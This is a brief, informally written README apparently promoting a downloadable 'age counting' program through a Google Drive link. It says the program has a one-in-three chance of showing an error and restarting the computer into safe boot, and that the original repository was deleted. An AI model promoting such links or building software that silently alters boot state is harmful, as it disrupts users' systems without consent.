START COUNTING YOUR AGE CORRECTLY. DOWNLOAD ----> https://drive.google.com/uc?export=download&amp;id=1z203C0fwE3WXQ401mjJnqGuKRVxNu5C1 [X64 ONLY]

This is a fun ap that only requests ur age and then displays it to user. You've got a 1/3 chance that
programm will display an error report an restart in safe boot status.

The actual version is 1.3 cause I had to delete the original repository.

P.S. soon I will add x86 version.
